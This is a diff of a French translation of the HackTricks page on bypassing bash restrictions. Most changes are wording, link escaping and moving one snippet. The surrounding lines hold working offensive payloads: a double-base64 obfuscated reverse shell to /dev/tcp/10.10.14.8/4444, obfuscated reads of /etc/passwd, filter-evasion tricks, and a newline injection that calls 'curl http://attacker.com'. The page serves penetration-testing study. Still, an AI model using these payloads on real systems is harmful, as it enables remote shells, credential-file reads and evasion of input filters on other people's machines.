@@ -17,14 +17,14 @@ Autres façons de soutenir HackTricks :
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
 
-## Contournements de limitations courantes
+## Contournements de Limitations Courantes
 
-### Shell inversé
+### Shell Inversé
 ```bash
 # Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
 echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
@@ -75,13 +75,18 @@ $(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
 $(rev<<<'imaohw') #whoami
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64
 
-
 # Execution through $0
 echo whoami|$0
 
 # Uninitialized variables: A uninitialized variable equals to null (nothing)
 cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
 p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters
+
+# New lines
+p\
+i\
+n\
+g # These 4 lines will equal to ping
 
 # Fake commands
 p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
@@ -115,12 +120,6 @@ X=$'cat\x20/etc/passwd'&&$X
 
 # Using tabs
 echo "ls\x09-l" | bash
-
-# New lines
-p\
-i\
-n\
-g # These 4 lines will equal to ping
 
 # Undefined variables and !
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
@@ -163,10 +162,10 @@ echo ${PATH:0:1} #/
 
 Vous pourriez utiliser **burpcollab** ou [**pingb**](http://pingb.in) par exemple.
 
-### Commandes internes
+### Commandes intégrées
 
-Dans le cas où vous ne pouvez pas exécuter des fonctions externes et que vous avez uniquement accès à un **ensemble limité de commandes internes pour obtenir une exécution de code à distance (RCE)**, il existe quelques astuces pratiques pour y parvenir. Habituellement, vous **ne pourrez pas utiliser toutes** les **commandes internes**, donc vous devriez **connaître toutes vos options** pour essayer de contourner la restriction. Idée de [**devploit**](https://twitter.com/devploit).\
-Tout d'abord, vérifiez toutes les [**commandes internes du shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ensuite, voici quelques **recommandations**:
+Dans le cas où vous ne pouvez pas exécuter des fonctions externes et que vous avez uniquement accès à un **ensemble limité de commandes intégrées pour obtenir une exécution de code à distance (RCE)**, il existe quelques astuces pratiques pour y parvenir. Habituellement, vous **ne pourrez pas utiliser toutes** les **commandes intégrées**, donc vous devriez **connaître toutes vos options** pour essayer de contourner la prison. Idée de [**devploit**](https://twitter.com/devploit).\
+Tout d'abord, vérifiez toutes les [**commandes intégrées du shell**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)**.** Ensuite, voici quelques **recommandations**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -228,8 +227,6 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
 ```
-### Bashfuscator
-
 ### Bashfuscateur
 ```bash
 # From https://github.com/Bashfuscator/Bashfuscator
@@ -317,7 +314,7 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Contournement de la protection en lecture seule/Noexec/Distroless
+## Contournement de la restriction en lecture seule/Noexec/Distroless
 
 Si vous vous trouvez dans un système de fichiers avec les **protections en lecture seule et noexec** ou même dans un conteneur distroless, il existe encore des moyens d'**exécuter des binaires arbitraires, voire un shell !:**
 
@@ -341,7 +338,7 @@ Si vous vous trouvez dans un système de fichiers avec les **protections en lect
 <figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=bypass-bash-restrictions) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
+Utilisez [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=bypass-bash-restrictions) pour construire et **automatiser facilement des workflows** alimentés par les outils communautaires les plus avancés au monde.\
 Accédez dès aujourd'hui :
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=bypass-bash-restrictions" %}
